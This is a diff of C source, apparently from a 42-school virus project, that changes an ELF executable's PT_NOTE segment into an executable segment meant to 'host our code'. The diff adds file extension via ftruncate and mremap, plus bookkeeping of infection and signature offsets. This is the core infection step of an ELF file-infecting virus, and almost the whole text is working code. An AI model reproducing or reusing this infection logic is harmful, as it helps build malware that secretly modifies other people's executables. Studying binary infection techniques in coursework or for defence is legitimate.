@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/11/06 09:45:03 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/06 12:30:43 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/06 13:07:53 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -17,13 +17,14 @@ static bool			find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size)
 
 //	Changes the first PT_NOTE segment into an executable segment that will host our code
 //
-//	Returns true on fatal error
+//	Returns true on error
 bool	change_note_segment(profiling *this, elf_data *data) {
 	size_t		note_off = 0;
 	int64_t		ret = 0;
 	uint64_t	new_seg_size;
 	Elf64_Phdr	*note = NULL;
 	Elf64_Phdr	*exec = NULL;
+	size_t		note_size;
 
 	(void)this;
 	(void)ret;
@@ -42,11 +43,18 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 		}
 	}
 
+	note_size = note->p_filesz;
+
 	new_seg_size = ((Elf64_Phdr *)((size_t)data->file + note_off))->p_filesz + this->size +
 						SIGNATURE_OFFSET + SIGNATURE_LEN;
 	new_seg_size += 0x1000 - (new_seg_size % 0x1000);
 
 	// Extend
+	ftruncate(ret, data->fd, data->mmap_size + new_seg_size);
+	if (ret < 0) {
+		printf(FILE_LINE("ftruncate \033[31mfailed\033[0m: %ld\n"), ret);
+		return true;
+	}
 	mremap(ret, data->file, data->mmap_size, data->mmap_size + new_seg_size, MREMAP_MAYMOVE);
 	if (ret >= -22 && ret < 0) {
 		printf(FILE_LINE("mremap \033[31mfailed\033[0m: %ld\n"), ret);
@@ -64,12 +72,18 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 	exec = exec_segment(data);
 
 	//	Changing the values of the PT_NOTE header
-	find_pvaddr(data, note, new_seg_size);
+	if (find_pvaddr(data, note, new_seg_size))
+		return true;
+	
 	note->p_flags = PF_R | PF_X;
 	note->p_filesz += this->size + SIGNATURE_OFFSET + SIGNATURE_LEN;
 	note->p_memsz = note->p_filesz;
 	note->p_offset = data->mmap_size;
 	note->p_align = exec->p_align;
+
+	//	Adding elf_data
+	data->infection_offset = note->p_offset;
+	data->signature_offset = data->infection_offset + this->size + SIGNATURE_OFFSET;
 
 	return false;
 }
